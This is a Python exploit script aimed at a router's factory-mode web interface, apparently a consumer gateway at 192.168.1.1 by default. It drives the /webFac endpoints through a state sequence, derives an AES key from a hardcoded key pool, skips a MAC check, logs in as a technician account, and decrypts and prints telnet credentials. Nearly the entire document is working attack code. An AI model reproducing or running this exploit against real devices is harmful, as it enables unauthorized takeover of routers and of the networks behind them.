#!/usr/bin/env python3

import socket, sys, time
from random import Random
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES

KEY_POOL = [
    0x8C, 0x23, 0x65, 0xD1, 0xFC, 0x32, 0x45, 0x37, 0x11, 0x28,
    0x71, 0x63, 0x07, 0x20, 0x69, 0x14, 0x73, 0xE7, 0xD4, 0x53,
    0x13, 0x24, 0x36, 0xC2, 0xB5, 0xE1, 0xFC, 0xCF, 0x8A, 0x9A,
    0x41, 0x89, 0x3C, 0x49, 0xCF, 0x5C, 0x72, 0x8C, 0x9E, 0xEB,
    0x75, 0x0D, 0x3F, 0xD1, 0xFE, 0xCC, 0x57, 0x65, 0x7A, 0x35,
    0x21, 0x3E, 0x68, 0x53, 0x7E, 0x97, 0x02, 0x48, 0x74, 0x71,
    0x95, 0x34, 0x53, 0x84, 0xB4, 0xC3, 0xE2, 0xD6, 0x27, 0x3D,
    0xE6, 0x5D, 0x72, 0x9C, 0xBC, 0x3D, 0x03, 0xFD, 0x76, 0xC1,
    0x9C, 0x25, 0xA8, 0x92, 0x47, 0xE4, 0x18, 0x0F, 0x24, 0x3F,
    0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99,
]

IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.1"


def pad(d):
    return d + b'\x00' * (16 - len(d) % 16)


def post(path, body):
    # raw sockets: httpd drops the connection after each response
    # and sometimes sends malformed replies that trip up requests/urllib
    if isinstance(body, str):
        body = body.encode()

    req = (
        f"POST {path} HTTP/1.0\r\n"
        f"Host: {IP}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    with socket.create_connection((IP, 80), timeout=5) as s:
        s.sendall(req)
        s.settimeout(5)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)

    resp = b"".join(chunks)
    if not resp:
        return 0, b""

    sep = b"\r\n\r\n" if b"\r\n\r\n" in resp else b"\n\n"
    if sep not in resp:
        return 0, resp

    hdr, body = resp.split(sep, 1)
    try:
        return int(hdr.split()[1]), body
    except (IndexError, ValueError):
        return 0, body


# malformed SendSq resets g_facTelnetStep to 0
post("/webFac", "SendSq.gch")

# RequestFactoryMode (0 -> 1)
post("/webFac", "RequestFactoryMode.gch")
time.sleep(1)

# SendSq key exchange (1 -> 3), derive AES-192 from pool
rand = Random().randint(0, 59)
code, body = post("/webFac", f"SendSq.gch?rand={rand}\r\n")
assert body.startswith(b"newrand="), f"bad response: {code} {body!r}"
newrand = int(body[8:].strip())
# FNV
idx = ((0x1000193 * rand) & 0x3F ^ newrand) % 60
key = bytes((x ^ 0xA5) & 0xFF for x in KEY_POOL[idx:idx + 24])
cipher = AES.new(key, AES.MODE_ECB)
print(f"[*] newrand={newrand}, index={idx}, key=0x{key.hex()}")

# SendInfo info=6| - empty blob, FF/FF early-out, skips MAC check (3 -> 2)
code, _ = post("/webFacEntry", cipher.encrypt(pad(b"SendInfo.gch?info=6|")))
assert code == 200, f"SendInfo failed ({code}) - wrong key pool?"

# CheckLoginAuth against IGD.AU1 / DevAuthInfo (2 -> 4 -> 5)
# NOTE: pass= value is the admin user psswd
code, body = post("/webFacEntry", cipher.encrypt(pad(b"CheckLoginAuth.gch?version50&user=tech&pass=[REDACTED]")))
assert code == 200, f"login failed ({code})"

# FactoryMode - random telnet creds, start tddiag (5 -> 6 -> 7 -> 8)
code, body = post("/webFacEntry", cipher.encrypt(pad(b"FactoryMode.gch?mode=2&user=notused")))
assert code == 200, f"FactoryMode failed ({code})"

resp = cipher.decrypt(body).rstrip(b'\x00').decode()
p = parse_qs(urlparse(resp).query)
print(f"user: {p['user'][0]}\npass: {p['pass'][0]}")
